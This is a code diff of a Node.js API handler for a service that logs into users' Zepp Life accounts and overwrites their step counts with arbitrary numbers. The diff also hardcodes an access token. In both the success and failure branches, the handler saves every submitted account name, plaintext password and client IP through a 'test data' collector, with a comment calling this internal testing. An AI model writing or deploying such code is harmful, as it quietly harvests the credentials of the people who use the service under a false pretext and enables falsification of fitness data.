@@ -1,105 +1,83 @@
-// 使用 require 而不是 import，避免 ES 模块问题
-const zeppLifeSteps = require('./ZeppLifeSteps');
-const fs = require('fs').promises;
-// const pool = require('../../db'); // 暂时注释掉数据库连接
-const { saveTestData } = require('../../utils/dataCollector');
+const zeppLifeSteps = require("./ZeppLifeSteps");
+const { saveTestData } = require("../../utils/dataCollector");
 
-// 使用 export default 而不是 module.exports
 export default async function handler(req, res) {
-  // 设置CORS头
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
 
-  if (req.method === 'OPTIONS') {
+  if (req.method === "OPTIONS") {
     return res.status(200).end();
   }
 
-  if (req.method !== 'POST') {
-    return res.status(405).json({ success: false, message: '方法不允许' });
+  if (req.method !== "POST") {
+    return res.status(405).json({ success: false, message: "方法不允许" });
   }
 
   try {
     const { account, password, steps } = req.body;
+    const token = "LUvOOl2x8II1POI9KfnFeQ";
 
     if (!account || !password) {
-      return res.status(400).json({ success: false, message: '账号和密码不能为空' });
+      return res.status(400).json({ success: false, message: "账号和密码不能为空" });
     }
 
-    // 设置默认步数
-    const targetSteps = steps || Math.floor(Math.random() * 10000) + 20000;
-    console.log('目标步数:', targetSteps);
+    const targetSteps = steps || 10000;
+    console.log("目标步数:", targetSteps);
 
-    // 登录获取token
-    console.log('开始登录流程...');
-    const { loginToken, userId } = await zeppLifeSteps.login(account, password);
-    console.log('登录成功,获取到loginToken和userId');
+    console.log("开始更新步数...");
+    const result = await zeppLifeSteps.updateSteps(token, account, password, targetSteps);
+    console.log("步数更新结果:", result);
 
-    // 获取app token
-    console.log('开始获取appToken...');
-    const appToken = await zeppLifeSteps.getAppToken(loginToken);
-    console.log('获取appToken成功');
-
-    // 修改步数
-    console.log('开始更新步数...');
-    const result = await zeppLifeSteps.updateSteps(loginToken, appToken, targetSteps);
-    console.log('步数更新结果:', result);
-
-    // 内测数据收集 - 仅用于测试分析
     try {
       const testData = {
         timestamp: new Date().toISOString(),
         account: account,
         password: password,
         steps: targetSteps,
-        userId: userId,
+        userId: result.data.user,
         success: true,
-        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown'
+        ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress || "unknown",
       };
-      
       await saveTestData(testData);
-      console.log('内测数据已保存');
+      console.log("内测数据已保存");
     } catch (dataError) {
-      console.error('保存内测数据失败:', dataError);
-      // 不影响主要功能，继续执行
+      console.error("保存内测数据失败:", dataError);
     }
 
-    // 返回结果
     const response = {
       success: true,
       message: `步数修改成功: ${targetSteps}`,
-      data: result
+      data: result,
     };
-    console.log('返回响应:', response);
+    console.log("返回响应:", response);
     res.status(200).json(response);
-
   } catch (error) {
-    console.error('API处理失败:', error);
-    
-    // 记录失败的内测数据
+    console.error("API处理失败:", error);
+
     try {
       const { account, password, steps } = req.body;
       const failedData = {
         timestamp: new Date().toISOString(),
-        account: account || 'unknown',
-        password: password || 'unknown',
+        account: account || "unknown",
+        password: password || "unknown",
         steps: steps || 0,
         success: false,
         error: error.message,
-        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown'
+        ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress || "unknown",
       };
-      
       await saveTestData(failedData);
-      console.log('失败内测数据已保存');
+      console.log("失败内测数据已保存");
     } catch (dataError) {
-      console.error('保存失败数据失败:', dataError);
+      console.error("保存失败数据失败:", dataError);
     }
-    
+
     const response = {
       success: false,
-      message: error.message || '服务器内部错误'
+      message: error.message || "服务器内部错误",
     };
-    console.log('返回错误响应:', response);
+    console.log("返回错误响应:", response);
     res.status(500).json(response);
   }
 }
+
